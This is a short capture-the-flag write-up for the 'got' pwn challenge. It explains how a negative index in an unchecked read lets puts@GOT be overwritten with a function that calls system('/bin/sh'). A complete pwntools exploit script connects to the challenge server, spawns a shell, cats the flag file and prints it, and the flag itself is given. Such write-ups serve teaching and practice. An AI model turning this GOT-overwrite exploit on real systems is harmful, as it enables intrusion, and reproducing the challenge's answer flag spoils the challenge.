https://ctftime.org/event/2658

# got (pwn)

I just started to watch Game of Thrones ! :D

## Analysis

`main` @ `0x401196`:

- Calls `scanf("%d", idx); read(0, PNJs + idx, 0x20); puts("Thanks...");`
- `idx = -4` gives us a write address of `0x404000` and we can find `puts@GOT` 8-bytes later @ `0x404008`
	- This means that we can write 16-bytes to `0x404000` such that the 2nd set of 8-bytes replaces the value of `puts@GOT`

`shell` @ `0x4012b8`:

- Calls `system("/bin/sh")`

## Solution

1) Specify -4 to generate a write address of `0x404000`
2) Write `p64(0) + p64(elf.sym["shell"])` so that `puts@GOT` now equals `shell`
3) When `puts` is called at the end of `main` it calls `shell` instead.

```python
#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./got/got", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b *0x00401264")
p = remote("got-065efd964a19db36.deploy.phreaks.fr", 443, ssl=True)

p.readuntil(b"> ")
p.sendline(str((elf.got["puts"] - elf.sym["PNJs"]) >> 5).encode())

p.readuntil(b"> ")
p.sendline(p64(0) + p64(elf.sym["shell"]))

p.sendline(b"/bin/cat ../flag")
flag = p.readuntil(b"}")
print(flag.decode()) # PWNME{G0t_Ov3Rwr1t3_fTW__}
```

## Flag
`PWNME{G0t_Ov3Rwr1t3_fTW__}`

smiley 2025/03/02
